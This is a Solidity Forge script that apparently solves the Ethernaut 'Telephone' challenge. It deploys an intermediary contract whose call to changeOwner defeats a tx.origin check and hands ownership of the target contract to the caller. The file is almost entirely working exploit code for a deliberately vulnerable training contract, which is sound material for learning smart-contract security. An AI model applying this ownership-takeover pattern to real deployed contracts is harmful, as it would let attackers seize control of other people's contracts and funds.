// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {

    Telephone public telephone;

    constructor() {
        telephone = Telephone(vm.envAddress("TELEPHONE_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        TelephoneExecutor executor = new TelephoneExecutor(telephone);
        executor.change(vm.addr(pk));
        vm.stopBroadcast();
        console.log("Owner: ", telephone.owner());
    }

    // forge script script/telephone.s.sol:TelephoneScript --broadcast
}

contract TelephoneExecutor {
    Telephone public telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
    }

    function change(address _owner) public {
        telephone.changeOwner(_owner);
    }
}
